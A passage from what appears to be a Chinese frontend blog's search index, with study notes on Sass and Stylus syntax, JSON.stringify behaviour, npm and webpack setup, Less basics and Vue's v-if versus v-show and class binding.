(14px/2)</span><br><span class="line">   top: 50px + 100px</span><br><span class="line">   right: var * 10%</span><br></pre></td></tr></table></figure><ol start="3"><li>嵌套</li></ol><p><code>sass</code>允许选择器嵌套。比如下面的<code>css</code>代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> div h1 &#123;</span><br><span class="line">   color: red</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">可以写成：</span><br><span class="line"></span><br><span class="line"> div &#123;</span><br><span class="line">   h1&#123;</span><br><span class="line">     color: red</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>stylus</code>同样支持选择器嵌套，上面的代码可以写成:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div</span><br><span class="line">  h1</span><br><span class="line">    color: red</span><br></pre></td></tr></table></figure><p><code>sass</code>也支持属性嵌套,比如<code>border-color</code>属性可以写成:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p&#123;</span><br><span class="line">    border: &#123;</span><br><span class="line">      color: red;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">border后面需要加上冒号</span><br></pre></td></tr></table></figure><p><strong>stylus没有这个功能</strong></p><ol start="4"><li>继承</li></ol><p><code>sass</code>允许一个选择器，继承另一个选择器。比如，现在<code>class1</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.class1 &#123;</span><br><span class="line">    border: 1px solid #ddd</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  class2要继承class1，就要使用@extend命令。</span><br><span class="line">  </span><br><span class="line">  .class2 &#123;</span><br><span class="line">    @extend .class1</span><br><span class="line">    font-size: 120%</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>stylus</code>的继承方式和<code>sass</code>基本一致，但有一些稍微的不同。</p><p><code>stylus</code>实现继承:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.class1</span><br><span class="line">    border: 1px solid #ddd</span><br><span class="line">    </span><br><span class="line"> .class2</span><br><span class="line">    @extend .class1</span><br><span class="line">    font-size: 120%</span><br></pre></td></tr></table></figure><p><strong>两者的区别主要在于–sass不允许@extend嵌套选择器:</strong><br>如下面的样式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div</span><br><span class="line">  h1</span><br><span class="line">   color: red</span><br></pre></td></tr></table></figure><p>在<code>sass</code>中，如果按照下面这样写就会直接编译错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.div2 &#123;</span><br><span class="line">   @extend div h1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在<code>stylus</code>中却可以成功编译，因为<code>stylus</code>中，只要选择器匹配，继承就会生效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.div2</span><br><span class="line">   @extend div h1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JSON.stringify详解</title>
      <link href="2020/04/12/%E6%95%B4%E7%90%86-JSON.stringify%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/04/12/%E6%95%B4%E7%90%86-JSON.stringify%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>我们都知道toString是用于处理非字符串到字符串的强制类型转换（隐式类型转换）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=&#123;&#125;  </span><br><span class="line">a.toString()   <span class="comment">//[object Object]</span></span><br><span class="line"><span class="keyword">let</span> b=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b.toString()   <span class="comment">//数组的toString被重写了，所以输出"1,2,3"</span></span><br></pre></td></tr></table></figure><p>JSON.stringify将JSON对象序列化时也用到了toString()</p><a id="more"></a><h3 id="先说结论"><a href="#先说结论" class="headerlink" title="先说结论"></a>先说结论</h3><ul><li><p>安全的JSON值可以序列化，不安全的JSON值会特殊处理</p></li><li><p>安全：字符串，数字，布尔值和null的JSON.stringify与toString基本相同</p></li><li>不安全：undefined,function,symbol会特殊处理，如果传递给JSON.stringify的对象中定义了toJSON方法，那么该方法会在字符串化前调用，将对象转化为安全JSON值</li></ul><h3 id="不安全的JSON值"><a href="#不安全的JSON值" class="headerlink" title="不安全的JSON值"></a>不安全的JSON值</h3><h3 id="（1）undefined-function-symbol"><a href="#（1）undefined-function-symbol" class="headerlink" title="（1）undefined,function,symbol"></a>（1）undefined,function,symbol</h3><ol><li>直接放在对象中：undefined</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(<span class="literal">undefined</span>)    <span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;) <span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(<span class="built_in">Symbol</span>(a))    <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure><ol start="2"><li>放在数组中：输出null</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(</span><br><span class="line">[<span class="number">1</span>,<span class="literal">undefined</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,<span class="built_in">Symbol</span>(a),<span class="number">4</span>]</span><br><span class="line">)</span><br><span class="line"><span class="comment">//[1,null,null,null,4]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(</span><br><span class="line">&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="literal">undefined</span>,<span class="attr">c</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,<span class="attr">d</span>:<span class="built_in">Symbol</span>(a),<span class="attr">e</span>:<span class="number">4</span>&#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment">//&#123;"a":1,"e":4&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（2）循环引用"><a href="#（2）循环引用" class="headerlink" title="（2）循环引用"></a>（2）循环引用</h3><p>可以定义toJSON方法来返回安全的JSON值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">    b:<span class="number">42</span>,</span><br><span class="line">    c:o,</span><br><span class="line">    d:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">o.e = a <span class="comment">//创建循环引用</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(a)) <span class="comment">//报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义一下toJSON</span></span><br><span class="line">a.toJSON = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">b</span>:<span class="keyword">this</span>.b&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(a)) <span class="comment">//&#123;"b":42&#125;</span></span><br></pre></td></tr></table></figure><p>也就是说，toJSON应该返回一个能够被字符串化的安全JSON值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line"> val: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line"> toJSON: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">this</span>.val.slice( <span class="number">1</span> );</span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(a)) <span class="comment">//"[2,3]"</span></span><br></pre></td></tr></table></figure><h2 id="JSON-stringify的几个参数"><a href="#JSON-stringify的几个参数" class="headerlink" title="JSON.stringify的几个参数"></a>JSON.stringify的几个参数</h2><h3 id="（1）replacer"><a href="#（1）replacer" class="headerlink" title="（1）replacer"></a>（1）replacer</h3><ul><li>是一个数组，那么他必须是一个字符串数组，其中包含的是要序列化的，除此之外的属性被忽略</li><li>是一个函数，对对象本身调用一次，然后对每个属性各调用一次</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">    b:<span class="number">42</span>,</span><br><span class="line">    c:<span class="string">"42"</span>,</span><br><span class="line">    d:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(a,[<span class="string">"b"</span>,<span class="string">"c"</span>]))</span><br><span class="line"><span class="comment">//&#123;"b":42,"c":"42"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(a,<span class="function"><span class="keyword">function</span>(<span class="params">k,v</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k!==<span class="string">"c"</span>) <span class="keyword">return</span> v</span><br><span class="line">&#125;))</span><br><span class="line"><span class="comment">//&#123;"b":42,"d":[1,2,3]&#125;</span></span><br></pre></td></tr></table></figure><h3 id="（2）space"><a href="#（2）space" class="headerlink" title="（2）space"></a>（2）space</h3><p>用于指定缩进格式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">    b:<span class="number">42</span>,</span><br><span class="line">    c:<span class="string">"42"</span>,</span><br><span class="line">    d:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(a,<span class="literal">null</span>,<span class="number">3</span>))</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">   "b": 42,</span></span><br><span class="line"><span class="comment">   "c": "42",</span></span><br><span class="line"><span class="comment">   "d": [</span></span><br><span class="line"><span class="comment">      1,</span></span><br><span class="line"><span class="comment">      2,</span></span><br><span class="line"><span class="comment">      3</span></span><br><span class="line"><span class="comment">   ]</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(a,<span class="literal">null</span>,<span class="string">'----'</span>))</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">----"b": 42,</span></span><br><span class="line"><span class="comment">----"c": "42",</span></span><br><span class="line"><span class="comment">----"d": [</span></span><br><span class="line"><span class="comment">--------1,</span></span><br><span class="line"><span class="comment">--------2,</span></span><br><span class="line"><span class="comment">--------3</span></span><br><span class="line"><span class="comment">----]</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="联系序列化深拷贝"><a href="#联系序列化深拷贝" class="headerlink" title="联系序列化深拷贝"></a>联系序列化深拷贝</h2><p>JSON.parse(JSON.stringify(obj)) 的问题：</p><ol><li>对象的属性值是函数时，无法拷贝。</li><li>原型链上的属性无法拷贝</li><li>不能正确的处理 Date 类型的数据</li><li>不能处理 RegExp</li><li>会忽略 symbol</li><li>会忽略 undefined</li></ol><p><strong>由此可知，无法处理函数,undefied,symbol是因为不是安全的JSON格式</strong></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.9</title>
      <link href="2020/04/09/%E6%97%A5%E5%B8%B8-2020.4.9/"/>
      <url>2020/04/09/%E6%97%A5%E5%B8%B8-2020.4.9/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是npm与webpack的安装</li><li>webpack打包实例</li><li>如何打包样式资源</li></ul><a id="more"></a><h2 id="1-什么是npm"><a href="#1-什么是npm" class="headerlink" title="1.什么是npm"></a>1.什么是npm</h2><p>NPM 的思路大概是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 买个服务器作为代码仓库（registry），在里面放所有需要被共享的代码</span><br><span class="line">2. 发邮件通知 jQuery、Bootstrap、Underscore 作者使用 npm publish 把代码提交到 registry 上，分别取名 jquery、bootstrap 和 underscore（注意大小写）</span><br><span class="line">3. 社区里的其他人如果想使用这些代码，就把 jquery、bootstrap 和 underscore 写到 package.json 里，然后运行 npm install ，npm 就会帮他们下载代码</span><br><span class="line">4. 下载完的代码出现在 node_modules 目录里，可以随意使用了。</span><br></pre></td></tr></table></figure><p>这些可以被使用的代码被叫做「包」（package），这就是 NPM 名字的由来：Node Package Manager</p><p><strong>可以安装淘宝镜像cnpm代替提高速度</strong></p><p><code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p><p><strong>然后安装webpack</strong></p><p><code>cnpm install webpack -g</code></p><p><strong>然后输入webpack -v会提示安装webpack-cli</strong></p><p><code>cnpm install webpack-cli -g</code></p><h2 id="2-webpack打包实例"><a href="#2-webpack打包实例" class="headerlink" title="2. webpack打包实例"></a>2. webpack打包实例</h2><ul><li>初始化一个包描述文件（package.json）</li></ul><p>使用命令<code>cnpm init</code>，命名为webpack_test，此时文件夹中会生成一个package.json文件</p><ul><li>新建一个src文件夹，里面新建一个index.js文件和data.json，将index.js作为入口文件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="keyword">import</span> data <span class="keyword">from</span> <span class="string">'./data.json'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(add(<span class="number">1</span>,<span class="number">2</span>))</span><br></pre></td></tr></table></figure><ul><li>为项目添加依赖 node_modules </li></ul><p><code>cnpm install webpack --save-dev</code></p><ul><li>新建一个build文件夹作为输出文件夹</li><li>运行指令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webpack ./src/index.js -o ./build/built.js --mode=development  //开发环境</span><br><span class="line">webpack ./src/index.js -o ./build/built.js --mode=production  //生产环境（压缩）</span><br></pre></td></tr></table></figure><ul><li>出现错误</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File C:\Users\Jin\AppData\Roaming\npm\webpack.ps1 cannot be loaded because running scripts is disabled on this system.</span><br><span class="line"></span><br><span class="line">不允许执行脚本，解决办法：</span><br><span class="line">以管理员身份运行power shell，运行一下代码  Set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure><ul><li>打包成功（webpack本身只识别js和json）</li></ul><h2 id="3-如何打包样式资源"><a href="#3-如何打包样式资源" class="headerlink" title="3. 如何打包样式资源"></a>3. 如何打包样式资源</h2><p>在学习这个之前，先学习一下模块化</p><p><a href="https://www.jianshu.com/p/67ce52c93392" target="_blank" rel="noopener">https://www.jianshu.com/p/67ce52c93392</a> ：理解CommonJs、AMD、CMD、ES6模块</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.8</title>
      <link href="2020/04/08/%E6%97%A5%E5%B8%B8-2020.4.8/"/>
      <url>2020/04/08/%E6%97%A5%E5%B8%B8-2020.4.8/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是Sass,Less</li><li>什么是webpack</li><li>webpack的核心概念</li></ul><a id="more"></a><h2 id="1-什么是Sass-Less"><a href="#1-什么是Sass-Less" class="headerlink" title="1. 什么是Sass,Less"></a>1. 什么是Sass,Less</h2><p>Sass和Less都属于Css预处理器，Css预处理器定义了一种新的语言，其基本思想是用一种专门的编程语言，为Css增加一些编程的特性，将Css作为目标生成文件，然后开发者使用这种语言进行Css编码工作(用一种专门的编程语言，进行Web网页样式设计，再通过编译器转化为正常的Css文件，以供项目使用)。</p><h4 id="为什么要使用Sass、Less"><a href="#为什么要使用Sass、Less" class="headerlink" title="为什么要使用Sass、Less"></a>为什么要使用Sass、Less</h4><p>因为css只是单纯的属性描述，它并不具有变量、条件语句等，css的特性导致了它难组织和维护。</p><h4 id="Less与Sass的共性："><a href="#Less与Sass的共性：" class="headerlink" title="Less与Sass的共性："></a>Less与Sass的共性：</h4><ul><li>混合(Mixins):将一个定义好的classA引入到另一个classB中，从而简单实现classB继承了classA的所有属性；</li><li>参数混合(Parametric):可以像函数一样传递参数的class</li><li>嵌套规则：class中嵌套class,从而减少重复的代码</li><li>运算：css中的数学计算</li><li>颜色功能：可以编辑你的颜色</li><li>命名空间：样式分组，从而方便被调用</li><li>作用域：局部修改样式</li><li>JavaScript表达式：在css样式中使用javaScript表达式赋值</li></ul><h4 id="Less的使用"><a href="#Less的使用" class="headerlink" title="Less的使用"></a>Less的使用</h4><p>(此处转载于<a href="https://www.jianshu.com/p/bf641d9d979a" target="_blank" rel="noopener">https://www.jianshu.com/p/bf641d9d979a</a> )</p><p>使用less，css文件的后缀名需要改为.less在html页面中加入下面代码。</p><p><img src="https://upload-images.jianshu.io/upload_images/5122957-6ae398f45b5a85e3.jpg?imageMogr2/auto-orient/strip|imageView2/2/w/639/format/webp" alt="img"></p><p>less定义变量</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@colors:</span><span class="number">#333</span>;</span><br><span class="line"><span class="selector-class">.div1</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:<span class="variable">@colors</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>less样式嵌套</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.div3</span>&#123;</span><br><span class="line">    <span class="selector-class">.div1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*可以直接嵌入.div1的样式*/</span></span><br></pre></td></tr></table></figure><p>less样式的运算</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@width:</span><span class="number">10%</span></span><br><span class="line">.myP&#123;</span><br><span class="line"><span class="attribute">width</span>:<span class="variable">@width</span>;</span><br><span class="line">    <span class="attribute">left</span>:<span class="number">50%</span>-<span class="variable">@width</span>/<span class="number">2</span></span><br><span class="line">    .mixin(red,<span class="number">#657</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>less样式的传参</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.div5</span>(<span class="variable">@widths</span>:<span class="number">5px</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">border-width</span>:<span class="variable">@widths</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-什么是webpack"><a href="#2-什么是webpack" class="headerlink" title="2. 什么是webpack"></a>2. 什么是webpack</h2><p>webpack是一种前端资源构建工具，一个静态模块打包器（module bundler）。在webpack看来，前端的所有资源文件（js/json/css/img/less…）都会作为模块处理。它将根据模块的依赖2关系进行静态分析，打包生成对应的静态资源（bundle）</p><p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=3378498490,2105022646&amp;fm=15&amp;gp=0.jpghttps://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=3378498490,2105022646&amp;fm=15&amp;gp=0.jpg" alt="3"></p><h2 id="3-webpack的核心概念"><a href="#3-webpack的核心概念" class="headerlink" title="3. webpack的核心概念"></a>3. webpack的核心概念</h2><h3 id="（1）入口-entry"><a href="#（1）入口-entry" class="headerlink" title="（1）入口(entry)"></a>（1）入口(entry)</h3><p>webpack 创建应用程序所有依赖的关系图。图的起点被称之为入口起点(<code>entry point</code>)。入口起点告诉 webpack 从哪里开始，并根据依赖关系图确定需要打包的内容。可以将应用程序的入口起点认为是根上下文或 APP第一个启动文件。</p><p>简单规则：每个 HTML 页面都有一个入口起点。单页应用(SPA)：一个入口起点，多页应用(MPA)：多个入口起点。</p><h3 id="（2）-输出-output"><a href="#（2）-输出-output" class="headerlink" title="（2） 输出(output)"></a>（2） 输出(output)</h3><p>将所有的资源(assets)归拢在一起后，还需要告诉 webpack 在哪里打包应用程序。webpack 的 <code>output</code> 属性描述了如何处理归拢在一起的代码(bundled code)。<code>output</code>选项可以控制webpack如何向硬盘写入编译文件。注意，即使可以存在多个<code>entry</code>起点，但只指定一个<code>output</code>配置。</p><h3 id="（3）loader"><a href="#（3）loader" class="headerlink" title="（3）loader"></a>（3）loader</h3><p>webpack自身只理解JavaScript。Loader让webpack能够去处理那些非Javascript文件。</p><h3 id="（4）Plugins"><a href="#（4）Plugins" class="headerlink" title="（4）Plugins"></a>（4）Plugins</h3><p>插件（plugins）可以用于执行范围更广的任务。插件的范围包括，从打包优化和压缩，一直到重新定义环境中的变量。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.6</title>
      <link href="2020/04/06/%E6%97%A5%E5%B8%B8-2020.4.6/"/>
      <url>2020/04/06/%E6%97%A5%E5%B8%B8-2020.4.6/</url>
      
        <content type="html"><![CDATA[<ul><li>v-show 与 v-if 区别</li><li>动态绑定class的方法</li><li>计算属性和 watch 的区别</li></ul><a id="more"></a><h2 id="v-show-与-v-if-区别"><a href="#v-show-与-v-if-区别" class="headerlink" title="v-show 与 v-if 区别"></a>v-show 与 v-if 区别</h2><p>相同点：v-if与v-show都可以动态控制dom元素显示隐藏</p><p>不同点：v-if显示隐藏是将dom元素整个添加或删除，而v-show隐藏则是为该元素添加css–display:none，dom元素还在。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">'isIf'</span>&gt;</span>我是v-if<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-show</span>=<span class="string">'isShow'</span>&gt;</span>我是v-show<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'vue.min.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">           el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">           data:&#123;</span></span><br><span class="line"><span class="javascript">               isIf:<span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">               isShow:<span class="literal">false</span></span></span><br><span class="line"><span class="undefined">           &#125;</span></span><br><span class="line"><span class="undefined">       &#125;)</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>性能消耗：</strong>v-if有更高的切换消耗；v-show有更高的初始渲染消耗；</p><p><strong>使用场景：</strong>v-if适合运营条件不大可能改变；v-show适合频繁切换。</p><p>对于管理系统的权限列表的展示，这里可以使用V-if来渲染,对于前台页面的数据展示，这里推荐使用V-show </p><h2 id="动态绑定class的方法"><a href="#动态绑定class的方法" class="headerlink" title="动态绑定class的方法"></a>动态绑定class的方法</h2><h3 id="（1）对象语法"><a href="#（1）对象语法" class="headerlink" title="（1）对象语法"></a>（1）对象语法</h3><p>给v-bind:class 设置一个<strong>对象</strong>，可以动态地切换class，如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">:class</span>=<span class="string">"&#123;'active':isActive&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">        data:&#123;</span></span><br><span class="line"><span class="javascript">            isActive:<span 